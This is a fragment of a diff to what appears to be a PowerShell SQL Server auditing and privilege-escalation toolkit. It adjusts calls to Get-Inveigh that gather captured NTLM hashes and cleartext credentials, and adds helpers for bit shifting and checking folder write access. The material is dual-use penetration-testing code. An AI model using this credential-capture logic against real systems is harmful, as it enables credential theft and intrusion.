                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
@@ -20275,21 +21062,21 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
+                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
@@ -20533,10 +21320,12 @@ Function Invoke-SQLAuditPrivDbChaining
             $ChainDatabases |
             ForEach-Object -Process {
                 $DatabaseName = $_.DatabaseName
-
-                Write-Verbose -Message "$Instance : - The database $DatabaseName has ownership chaining enabled."
-                $Details = "The database $DatabaseName was found configured with ownership chaining enabled."
-                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+				if($DatabaseName -ne 'master' -and $DatabaseName -ne 'tempdb' -and $DatabaseName -ne 'msdb')
+				{
+					Write-Verbose -Message "$Instance : - The database $DatabaseName has ownership chaining enabled."
+					$Details = "The database $DatabaseName was found configured with ownership chaining enabled."
+					$null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+				}
             }
         }
         else
@@ -25242,18 +26031,45 @@ function Invoke-Parallel
 
 # Source: http://www.padisetty.com/2014/05/powershell-bit-manipulation-and-network.html
 # Notes: Changed name from checkSubnet to Test-Subnet (Approved Verbs)
+# Updates by Ryan Cobb (cobbr)
 function Test-Subnet ([string]$cidr, [string]$ip)
 {
     $network, [int]$subnetlen = $cidr.Split('/')
     $a = [uint32[]]$network.split('.')
-    [uint32] $unetwork = ($a[0] -shl 24) + ($a[1] -shl 16) + ($a[2] -shl 8) + $a[3]
+    [uint32] $unetwork = (Convert-BitShift $a[0] -Left 24) + (Convert-BitShift $a[1] -Left 16) + (Convert-BitShift $a[2] -Left 8) + $a[3]
 
-    $mask = (-bnot [uint32]0) -shl (32 - $subnetlen)
+    $mask = Convert-BitShift (-bnot [uint32]0) -Left (32 - $subnetlen)
 
     $a = [uint32[]]$ip.split('.')
-    [uint32] $uip = ($a[0] -shl 24) + ($a[1] -shl 16) + ($a[2] -shl 8) + $a[3]
+    [uint32] $uip = (Convert-BitShift $a[0] -Left 24) + (Convert-BitShift $a[1] -Left 16) + (Convert-BitShift $a[2] -Left 8) + $a[3]
 
     $unetwork -eq ($mask -band $uip)
+}
+
+# Source: https://stackoverflow.com/questions/35116636/bit-shifting-in-powershell-2-0
+function Convert-BitShift {
+    param (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [int] $Number,
+
+        [Parameter(ParameterSetName = 'Left', Mandatory = $False)]
+        [int] $Left,
+
+        [Parameter(ParameterSetName = 'Right', Mandatory = $False)]
+        [int] $Right
+    ) 
+
+    $shift = 0
+    if ($PSCmdlet.ParameterSetName -eq 'Left')
+    { 
+        $shift = $Left
+    }
+    else
+    {
+        $shift = -$Right
+    }
+
+    return [math]::Floor($Number * [math]::Pow(2,$shift))
 }
 
 
@@ -25261,8 +26077,8 @@ function Test-Subnet ([string]$cidr, [string]$ip)
 
 #########################################################################
 #
-#region                 Primary FUNCTIONs
-#          Invoke-SQLDump, Invoke-SQLAudit, Invoke-SQLEscalatePriv
+#region          PRIMARY FUNCTIONS
+#                Invoke-SQLDump, Invoke-SQLAudit, Invoke-SQLEscalatePriv
 #
 #########################################################################
 
@@ -25365,6 +26181,15 @@ Function Invoke-SQLAudit
 
     Begin
     {
+
+        # If provided, verify write access to target directory
+        if($OutFolder){
+            if((Test-FolderWriteAccess "$OutFolder") -eq $false){
+                Write-Verbose -Message 'YOU DONT APPEAR TO HAVE WRITE ACCESS TO THE PROVIDED DIRECTORY.'
+                BREAK
+            }
+        }        
+
         # Table for output
         $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
